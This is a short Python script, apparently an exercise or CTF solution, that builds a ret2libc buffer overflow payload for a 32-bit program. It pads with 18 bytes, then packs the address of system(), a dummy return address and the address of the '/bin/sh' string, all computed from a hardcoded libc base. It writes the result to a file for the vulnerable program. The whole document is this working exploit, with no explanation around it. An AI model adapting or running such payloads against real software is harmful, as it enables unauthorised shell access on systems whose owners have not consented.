import struct

libc_base_addr = 0xb7e2c000
system_offset = 0x0003f060
bin_sh_offset = 0x160c58

# Create the payload
payload = b"a" * 18
payload += struct.pack("<I", libc_base_addr + system_offset)
payload += b"TEST"
payload += struct.pack("<I", libc_base_addr + bin_sh_offset)

# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)
